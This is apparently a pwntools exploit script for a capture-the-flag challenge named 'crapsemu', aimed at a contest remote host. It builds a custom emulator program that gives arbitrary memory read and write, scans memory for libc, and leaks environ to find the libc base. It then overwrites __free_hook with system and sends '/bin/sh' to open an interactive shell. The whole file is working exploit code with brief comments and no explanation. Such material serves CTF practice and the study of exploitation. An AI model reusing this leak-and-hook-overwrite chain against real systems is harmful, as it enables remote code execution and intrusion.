#!/usr/bin/env python3
from pwn import *

exe = ELF("crapsemu")
context(binary=exe)#, log_level="debug")

libc = ELF("libc.so.6", checksec=False)

LOCAL = 0
if LOCAL:
	def rmt():
		return exe.process()
# 	gdb.attach(r, """
# b exit
# c
# """)
else:
	def rmt():
		return remote("remote1.thcon.party", 10905)


def toint(x):
	try:
		return int(x, 0)
	except TypeError:
		return int(x)

def reg(reg_or_imm):
	try:
		return None, toint(reg_or_imm)
	except ValueError:
		aliases = {
			"ZERO": 0x00,
			"TMP": 0x15,
			"PC": 0x1E,
			"FETCH": 0x1F,
		}
		
		if reg_or_imm.upper() in aliases:
			return aliases[reg_or_imm.upper()], None
		else:
			return int(reg_or_imm[1:]), None

def make_xyz(mnemonic, ra="ZERO", rb="ZERO", rc="ZERO"):
	mn = mnemonic.lower()
	opcode = {
		"add":  0x00,
		"and":  0x01,
		"orr":  0x02,
		"xor":  0x03,
		"sub":  0x04,
		"shr":  0x0D,
		"shl":  0x0E,
		"adds": 0x10,
		"ands": 0x11,
		"orrs": 0x12,
		"xors": 0x13,
		"subs": 0x14,
		"x13":  0x20,
		"x25":  0x21,
		"sl8":  0x23,
		"movb": 0x02,
		"cmp":  0x14,
		"ldr":  0x00,
		"str":  0x04,
	}[mn]
	
	is_mem = False
	if mn == "movb":
		rz, rx, ry = ra, "ZERO", rb
	elif mn == "cmp":
		rz, rx, ry = "ZERO", ra, rb
	elif mn in ["ldr", "str"]:
		is_mem = True
		rz, rx, ry = ra, rb, rc
	else:
		rz, rx, ry = ra, rb, rc
	
	rz = reg(rz)[0]
	assert rz is not None
	rx = reg(rx)[0]
	assert rx is not None
	ry, imm = reg(ry)
	
	is_mem = mn in ["ldr", "str"]
	insn = (1 << 31) | (is_mem << 30) | (rz << 25) | (opcode << 19) | (rx << 14)
	if imm is not None:
		insn |= (1 << 13) | (imm & 0x1fff)
	else:
		insn |= ry
	
	return insn

def make_syscall():
	return 1 << 30

def make_jcc(mnemonic, src, dst):
	src = toint(src)
	dst = toint(dst)
	
	cc = {
		"jeq": 0x1,
		"jle": 0x2,
		"jlt": 0x3,
		"jvs": 0x5,
		"jng": 0x6,
		"jcs": 0x7,
		"jmp": 0x8,
		"jne": 0x9,
		"jgt": 0xA,
		"jge": 0xB,
		"jvc": 0xD,
		"jps": 0xE,
		"jcc": 0xF,
	}[mnemonic.lower()]
	
	target = (dst - src) & 0x1ffffff
	return (1 << 29) | (cc << 25) | target

def make_movt(rz, imm):
	imm = toint(imm)
	rz = reg(rz)[0]
	return (rz << 24) | ((imm >> 8) & 0xffffff)

def make_insn(mnemonic, *args, **kwargs):
	mn = mnemonic.lower()
	if mn == "movt":
		return make_movt(*args, **kwargs)
	elif mn == "syscall":
		return make_syscall()
	elif mn.startswith("j"):
		return make_jcc(mn, *args, **kwargs)
	else:
		return make_xyz(mn, *args, **kwargs)

def asm(s, *args, **kwargs):
	parts = s.replace(",", "").split()
	return [make_insn(*(parts + list(args)), **kwargs)]

def syscall(a, b=None, c=None, d=None):
	ret = movi("r1", a)
	if b is not None: ret += movi("r2", b)
	if c is not None: ret += movi("r3", c)
	if d is not None: ret += movi("r4", d)
	ret += asm("syscall")
	return ret

def movi(r, val):
	if val & ~0x1fff:
		return asm("movt", r, val) + asm("orr", r, r, val & 0xff)
	else:
		return asm("movb", r, val)


program = (
	# write(STDOUT_FILENO, *0, 4);
	syscall(1, 1, 0, 4) +                   #0-4
	
	# while(1) {
	
	#   read(STDIN_FILENO, 0xfe, 4);
	syscall(0, 0, 0xfd, 8) +                #5-9
	
	#   leak_count = *0xfd
	asm("ldr r8, ZERO, 0xfd") +             #A
	
	#   if(leak_count == 0) goto write64;
	asm("cmp r8, ZERO") +                   #B
	asm("jeq 0xC, 0x28") +                  #C
	
	#   ptr = *0xfe;
	asm("ldr r6, ZERO, 0xfe") +             #D
	
	#   if(!ptr) break;
	asm("cmp r6, ZERO") +                   #E
	asm("jeq 0xF, 0x1D") +                  #F
	
	#   for(count = 0; count < 0x400; count++) {
	asm("xor r7, r7, r7") +                 #10
	
	#     dword = *ptr;
	asm("ldr r5, ZERO, r6") +               #11
	asm("str r5, ZERO, 0x100") +            #12
	
	#     write(STDOUT_FILENO, &dword, sizeof(dword));
	syscall(1, 1, 0x100, 4) +               #13-17
	
	#     ++ptr;
	asm("add r6, r6, 1") +                  #18
	
	#     ++count;
	asm("add r7, r7, 1") +                  #19
	asm("cmp r7, r8") +                     #1A
	asm("jlt 0x1B, 0x11") +                 #1B
	#   }
	
	# }
	asm("jmp 0x1C, 0x5") +                  #1C
	
	# write(STDOUT_FILENO, "\xd9\xab\x12\xf8", 4);
	movi("r8", 0xf812abd9) +                #1D-1F
	asm("str r8, ZERO, 0xff") +             #20
	syscall(1, 1, 0xff, 4) +                #21-24
	
	# exit(123);
	syscall(2, 123) +                       #25-27
	
	# write64:
	# read(STDIN_FILENO, 0xf8, 8)
	syscall(0, 0, 0xf8, 8) +                #28-2C
	
	# ptr = *0xfe
	asm("ldr r6, ZERO, 0xfe") +             #2D
	
	# value = *0xf8, *0xf9
	asm("ldr r8, ZERO, 0xf8") +             #2E
	asm("ldr r9, ZERO, 0xf9") +             #2F
	asm("str r8, ZERO, r6") +               #30
	asm("str r9, r6, 0x1") +                #31
	
	# Trigger free(read_buffer) which should now do system(read_buffer)
	# read(STDIN_FILENO, 0x200, 8)
	syscall(0, 0, 0x200, 8) +               #32-36
	
	# exit(101)
	syscall(2, 101)                         #37-39
)

rom = b"".join(p32(insn) for insn in program)

with open("rom.bin", "wb") as f:
	f.write(rom)

def send_program(progdata):
	r = rmt()
	r.recvuntil(b"Input your CRAPS program: \n")
	r.send(progdata)
	return r

def leak_page(r, index):
	r.send(p32(0x400) + p32(index))
	return r.recvn(0x1000)

def leak32(r, index):
	r.send(p32(1) + p32(index))
	return u32(r.recvn(4))

def leak64(r, index):
	r.send(p32(2) + p32(index))
	return u64(r.recvn(8))

def write64(r, index, value):
	r.send(p32(0) + p32(index))
	r.send(p64(value))

def got_libc(f, page, addr):
	f.write(page)
	# print(hexdump(page, begin=addr))
	
	return page.startswith(b"\x7fELF")

start_index = 0x2000
page_index = 0
libc_found = False

with open("leak.bin", "wb") as f:
	while True:
		r = send_program(rom)
		r.recvuntil(p32(program[0]))
		
		# context.log_level = "info"
		
		try:
			page = leak_page(r, start_index)
			if got_libc(f, page, start_index * 4):
				libc_found = True
				break
			
			while True:
				page_index += 1
				addr = start_index + page_index * 0x400
				page = leak_page(r, addr)
				if got_libc(f, page, addr * 4):
					libc_found = True
					break
			
			if libc_found:
				break
		except EOFError:
			print("Failed to leak page at index %#x" % (start_index + page_index * 0x400,))
			if page_index == 0:
				start_index += 0x400
				continue
		
		print("Didn't find an ELF header")
		exit(1)


#                                     #0x00007f4484a2bc00
# libc_base_seen = 0x00007ffff79e4000 #0x00007f8f5af05000
# libc_data_seen = 0x00007ffff7dcf000 #0x00007f8f5b2f0000
# off_to_libc_data = libc_data_seen - libc_base_seen
off_to_environ = 0x1EAEB0 #libc.got["environ"]
index_to_environ = off_to_environ // 4

environ_index = start_index + page_index * 0x400 + index_to_environ
info("libc's page containing __free_hook *should* be at index %#x" % environ_index)

# context.log_level = "debug"

try:
	environ_addr = leak64(r, environ_index)
	info("&environ is %#x" % environ_addr)
except EOFError:
	print("Failed to access that memory")

libc.address += environ_addr - libc.symbols["environ"]

target = libc.symbols["__free_hook"]
environ_to_target = target - (libc.address + off_to_environ)
target_index = environ_index + environ_to_target // 4

info("index for __free_hook is %#x" % target_index)
info("old __free_hook is %#x" % leak64(r, target_index))
write64(r, target_index, libc.symbols["system"])

r.send("/bin/sh\0")
r.interactive()
